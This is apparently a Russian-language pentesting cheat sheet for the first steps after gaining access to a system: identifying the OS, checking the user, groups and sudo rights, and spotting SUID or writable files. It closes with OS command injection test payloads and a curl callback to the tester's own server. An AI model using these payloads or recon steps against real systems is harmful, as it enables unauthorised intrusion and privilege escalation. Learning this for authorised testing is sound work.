Для начала не нужно знать все команды. 
Нужно знать **5-10 команд**, которые отвечают на три вопроса:

1. **Где я?**
2. **Кто я?**
3. **Что тут есть?**

---
# 1: ОПРЕДЕЛЯЕМ СИСТЕМУ (Windows/Mac/Linux)

Запуск по порядку. Какая первая сработает — та система и стоит.

uname -a                    — если сработала → Linux / Mac (видно по ядру). Если ошибка → иди дальше.  
ver                              — если сработала → Windows (версия). Если ошибка → иди дальше.  
cat /etc/os-release    — если сработала → Linux. Если ошибка → иди дальше.  
sw_vers                      — если сработала → Mac. Если ошибка → иди дальше.

Универсальный  для всех систем может подойти - возможно :  
uname -a 2>/dev/null && echo "Linux/Mac" || (ver 2>/dev/null && echo "Windows" || echo "❓ Хуy пойми, но не стандарт")

-----
# 2: ДИСТРИБУТИВ (Linux)

 Лучшие команды (по приоритету):

cat /etc/os-release     — Золотой стандарт. Есть везде на новых системах.  
cat /etc/*release           — Подхватит CentOS, RedHat, Debian, Arch.  
cat /etc/issue              — Старые системы, загрузочное приветствие.  
lsb_release -a             — Если установлен LSB.  
hostnamectl               — systemd системы (современный Linux).

 По пакетному менеджеру (если всё сломалось):

which apt — Debian / Ubuntu / Kali.  
which yum — CentOS / RHEL / Fedora (<22).  
which dnf — Fedora / RHEL 8+.  
which pacman — Arch / Manjaro.  
which apk — Alpine (контейнеры, докер).

-----
#  3: macOS (если uname выдал Darwin)

sw_vers — ProductName, ProductVersion, BuildVersion.  
system_profiler SPSoftwareDataType — Дохуя инфы.  
defaults read loginwindow SystemVersionStampAsString — Тоже версия.  
uname -m — Архитектура (arm64 = M1/M2, x86_64 = Intel).

-------
#  4: Windows 

CMD (старый добрый):  
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"  
ver  
wmic os get caption, version, buildnumber

PowerShell (если пускает):  
Get-ComputerInfo | Select WindowsProductName, WindowsVersion, OsHardwareAbstractionLayer  
[Environment]::OSVersion

-----
# 5: АРХИТЕКТУРА (32/64 бита)

Linux — uname -m (x86_64 = 64bit, i686 = 32bit).  
Mac — uname -m.  
Windows — echo %PROCESSOR_ARCHITECTURE%.

-----
# ЧЕК-ЛИСТ

Попал в систему. Делаешь по порядку:

1. whoami             — кто я?
    
2. uname -a         — что за система?
    
3. cat /etc/os-release         — если Linux, какой именно?
    
4. ver           — если Windows, какая версия?
    
5. sw_vers         — если Mac, какая версия?
    
6. pwd && ls -la        — где я и что рядом?
    

Всё дальше по задаче.


----





















---

## ТОП-5 КОМАНД ПРИ ПОПАДАНИИ В СИСТЕМУ

### ==1. `whoami` — Кто я?



==whoami==
# root  -> ТЫ БОГ, ВСЁ МОЖЕШЬ
# www-data -> веб-сервер, почти ничего нельзя
# john -> обычный юзер

-----

### ==2. `id` — А что я могу?

Покажет группы. Если ты в группе `sudo` или `wheel` — ты будешь root через пароль.



==id==
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
# Всё плохо, ты никто


---

### ==3. `pwd` + `ls -la` — Где я и что рядом?



pwd        # /var/www/html  -> сайт
ls -la     # смотрим файлы. Ищем .env, config.php, backup

**Особенно смотри на права:**

- `-rwxrwxrwx` — файл который **все** могут редактировать/запускать (ебейший подарок)
    
- `-rwsr-xr-x` — **SUID бит** (это вообще подарок, можешь запустить файл от root'а)
    


-----

### ==4. `sudo -l` — Могу ли я стать богом?

bash

sudo -l
# Если спросит пароль — у тебя проблемы
# Если выдаст список команд — ТЫ В ИГРЕ

Пример вывода:



User www-data may run the following commands:
    (ALL) NOPASSWD: /bin/systemctl

Означает: ты можешь перезапускать службы **без пароля**. Это точка входа.


---

### ==5. `uname -a` + `cat /etc/os-release` — Куда я попал?

bash

uname -a     # ядро, версия, архитектура
cat /etc/os-release  # Ubuntu 20.04 / Debian / CentOS

Нужно чтобы понять:

- Какие эксплоиты искать
    
- Какие команды работают (apt или yum)
    

---

## 🪟 ЕСЛИ ЭТО WINDOWS

Те же вопросы, другие команды:

|Вопрос|Linux|Windows|
|---|---|---|
|Кто я?|`whoami`|`whoami`|
|Группы?|`id`|`whoami /groups`|
|Что тут?|`ls -la`|`dir`|
|Инфо о системе|`uname -a`|`systeminfo`|
|Привилегии|`sudo -l`|`whoami /priv`|

---

## 💉 КАК ПОНЯТЬ, ЧТО Я МОГУ ВЫЗВАТЬ КОМАНДУ?

**Это про OS Command Injection.**

Ты на вебе, есть форма поиска. Ты вводишь:

text

ping 127.0.0.1

Если вернулся вывод пинга — **О, БЛЯ, ЗАРАБОТАЛО**.

**Тестовые пейлоады (сработает — поймешь):**

**Linux:**

bash

; whoami
| whoami
`whoami`
$(whoami)

**Windows:**

cmd

| whoami
& whoami

**Как понять что выполнилось?**

- Вывелось имя пользователя
    
- Задержка по времени (`; sleep 5`)
    
- Пинг на твой сервер (`; curl http://твой-айпи:8080/`)
    

---
